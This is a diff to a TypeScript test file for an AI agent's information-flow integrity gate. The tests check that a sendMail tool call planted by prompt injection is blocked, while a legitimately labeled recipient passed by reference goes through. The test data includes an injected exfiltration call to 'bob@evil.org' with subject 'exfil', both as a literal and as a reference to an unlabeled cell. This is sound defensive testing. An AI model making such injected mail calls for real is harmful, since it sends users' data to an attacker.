@@ -136,21 +136,78 @@ async function setupSendMail(
     false,
   );
 
-  const sendInjected = async () => {
+  const sendCall = async (input: unknown) => {
     await llmToolExecutionHelpers.executeToolCalls(runtime, space, catalog, [{
       type: "tool-call",
-      toolCallId: "call-injected",
+      toolCallId: "call-under-test",
       toolName: "sendMail",
-      input: { recipient: "bob@evil.org", subject: "exfil", body: "stuff" },
+      input,
     }] as any);
     await runtime.idle();
   };
 
-  const injectedWasSent = async () => {
+  const sendInjected = () =>
+    sendCall({ recipient: "bob@evil.org", subject: "exfil", body: "stuff" });
+
+  const sentEmails = async () => {
     const emails = (await result.key("emails").pull()) as
       | { recipient: string }[]
       | undefined;
-    return (emails ?? []).some((e) => e.recipient === "bob@evil.org");
+    return emails ?? [];
+  };
+
+  const injectedWasSent = async () =>
+    (await sentEmails()).some((e) => e.recipient === "bob@evil.org");
+
+  // Persist a recipient value whose stored label carries the kernel integrity
+  // atom, and return the by-reference form the model would pass. Builtin-type
+  // atoms are runtime-minted evidence, so the seed write must run under a
+  // builtin identity — exactly how the real agent kernel binds a
+  // direct-command value (pattern code cannot forge this, see
+  // cfc-integrity-mint-gate.test.ts).
+  const seedKernelRecipient = async (name: string, value: string) => {
+    const seedTx = runtime.edit();
+    seedTx.setCfcImplementationIdentity({
+      kind: "builtin",
+      builtinId: "agent-kernel-demo",
+    });
+    const cell = runtime.getCell(
+      space,
+      name,
+      {
+        type: "string",
+        ifc: { integrity: [KERNEL_ATOM] },
+      } as const satisfies JSONSchema,
+      seedTx,
+    );
+    cell.set(value);
+    seedTx.prepareCfc();
+    const commit = await seedTx.commit();
+    expect(commit.ok).toBeDefined();
+    await runtime.idle();
+    return {
+      "@link": createLLMFriendlyLink(cell.getAsNormalizedFullLink(), space),
+    };
+  };
+
+  // The integrity-less twin of seedKernelRecipient: a plain stored value with
+  // no label at all, referenced the same way.
+  const seedPlainRecipient = async (name: string, value: string) => {
+    const seedTx = runtime.edit();
+    const cell = runtime.getCell(
+      space,
+      name,
+      { type: "string" } as const satisfies JSONSchema,
+      seedTx,
+    );
+    cell.set(value);
+    seedTx.prepareCfc();
+    const commit = await seedTx.commit();
+    expect(commit.ok).toBeDefined();
+    await runtime.idle();
+    return {
+      "@link": createLLMFriendlyLink(cell.getAsNormalizedFullLink(), space),
+    };
   };
 
   const dispose = async () => {
@@ -158,7 +215,15 @@ async function setupSendMail(
     await storageManager.close();
   };
 
-  return { sendInjected, injectedWasSent, dispose };
+  return {
+    sendCall,
+    sendInjected,
+    sentEmails,
+    injectedWasSent,
+    seedKernelRecipient,
+    seedPlainRecipient,
+    dispose,
+  };
 }
 
 describe("CFC trusted agent: tool-input requiredIntegrity (Epic D2)", () => {
@@ -167,6 +232,75 @@ describe("CFC trusted agent: tool-input requiredIntegrity (Epic D2)", () => {
     try {
       await t.sendInjected();
       expect(await t.injectedWasSent()).toBe(false);
+    } finally {
+      await t.dispose();
+    }
+  });
+
+  it("allows a by-reference recipient carrying the required integrity", async () => {
+    // The legitimate path (plan D2 / spec test-plan item 2): the model passes
+    // the recipient BY REFERENCE — a `{"@link": …}` object naming a cell whose
+    // stored label carries the kernel atom — instead of re-emitting it as
+    // text. The floor is satisfied by the referenced cell's integrity and the
+    // tool executes. This proves the gate doesn't over-block the direct-command
+    // route the demo's safe agent uses.
+    const t = await setupSendMail("enforce-explicit", true);
+    try {
+      const recipientRef = await t.seedKernelRecipient(
+        "direct-command-recipient",
+        "john@example.org",
+      );
+      await t.sendCall({
+        recipient: recipientRef,
+        subject: "approved",
+        body: "summary",
+      });
+      const emails = await t.sentEmails();
+      expect(emails.map((e) => e.recipient)).toEqual(["john@example.org"]);
+    } finally {
+      await t.dispose();
+    }
+  });
+
+  it("refuses a by-reference recipient whose cell lacks the kernel atom", async () => {
+    // The discriminating negative for the allowed path: being a reference is
+    // NOT enough — the gate must read the referenced cell's stored label. A
+    // link to an integrity-less cell (e.g. one the injected briefing text was
+    // copied into) fails the floor exactly like a literal.
+    const t = await setupSendMail("enforce-explicit", true);
+    try {
+      const plainRef = await t.seedPlainRecipient(
+        "unlabeled-recipient",
+        "bob@evil.org",
+      );
+      await t.sendCall({
+        recipient: plainRef,
+        subject: "exfil",
+        body: "stuff",
+      });
+      expect(await t.sentEmails()).toEqual([]);
+    } finally {
+      await t.dispose();
+    }
+  });
+
+  it("allows the JSON-string form of a by-reference recipient", async () => {
+    // Models frequently serialize the link object into a string — the
+    // resolver (traverseAndCellify) accepts a JSON-encoded `{"@link": …}`
+    // string as the same reference, so the gate must too.
+    const t = await setupSendMail("enforce-explicit", true);
+    try {
+      const recipientRef = await t.seedKernelRecipient(
+        "direct-command-recipient-string-form",
+        "john@example.org",
+      );
+      await t.sendCall({
+        recipient: JSON.stringify(recipientRef),
+        subject: "approved",
+        body: "summary",
+      });
+      const emails = await t.sentEmails();
+      expect(emails.map((e) => e.recipient)).toEqual(["john@example.org"]);
     } finally {
       await t.dispose();
     }
